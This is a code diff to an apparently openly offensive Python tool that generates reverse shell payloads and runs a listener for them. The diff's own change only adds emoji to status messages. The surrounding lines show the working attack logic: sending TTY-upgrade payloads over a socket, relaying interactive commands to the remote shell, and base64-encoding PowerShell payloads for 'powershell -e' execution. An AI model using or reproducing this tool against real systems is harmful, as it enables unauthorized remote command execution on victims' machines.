@@ -79,7 +79,7 @@ def listener(ip, port):
     shell_upgraded = False
     try:
         for payload in tty_payloads:
-            print(f"{Fore.YELLOW}[*] Trying TTY upgrade with: {payload}")
+            print(f"{Fore.YELLOW}[*] Trying TTY upgrade with: {payload} 😏")
             conn.send((payload + "\n").encode())
             time.sleep(1)
             conn.send(b"tty\n")
@@ -87,14 +87,14 @@ def listener(ip, port):
             try:
                 data = conn.recv(1024).decode()
                 if "not a tty" not in data.lower():
-                    print(f"{Fore.GREEN}[+] Shell upgraded using: {payload}")
-                    print(f"{Fore.GREEN}[+] Press Enter to drop into shell")
+                    print(f"{Fore.GREEN}[+] Shell upgraded using: {payload} 💪")
+                    print(f"{Fore.GREEN}[+] Press Enter to drop into shell 😄")
                     shell_upgraded = True
                     break
             except socket.timeout:
                 pass
         if not shell_upgraded:
-            print("{Fore.RED}[-] Failed to upgrade TTY shell using known methods.")
+            print("{Fore.RED}[-] Failed to upgrade TTY shell using known methods. 🤧")
 
         while True:
             try:
@@ -118,7 +118,7 @@ def listener(ip, port):
                     break
                 conn.send((command + "\n").encode())
             except KeyboardInterrupt:
-                print("\n{Fore.RED}[!] Ctrl+C pressed. Closing connection.")
+                print("\n{Fore.RED}[!] Ctrl+C pressed. Closing connection. 👋")
                 break
     except Exception as e:
         print(f"{Fore.RED}[!] Exception: {e}")
@@ -137,12 +137,12 @@ def main():
     print(f"{Fore.YELLOW}\n[+] Reverse Shell Payload ({args.type}):\n\n{Fore.BLUE}{payload}\n")
 
     if args.type == "powershell":
-        encode = input("[?] Encode PowerShell payload (Y/N)? ").strip().lower()
+        encode = input("[?] Encode PowerShell payload (Y/N)? 🤔").strip().lower()
         if encode == "y":
             b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
             print(f"{Fore.GREEN}\n[+] Encoded PowerShell: powershell -e {b64}\n")
 
-    save = input("[?] Save payload to file (Y/N)? ").strip().lower()
+    save = input("[?] Save payload to file (Y/N)? 🤔").strip().lower()
     if save == "y":
         fname = input("Enter filename: ").strip()
         with open(fname, "w") as f:
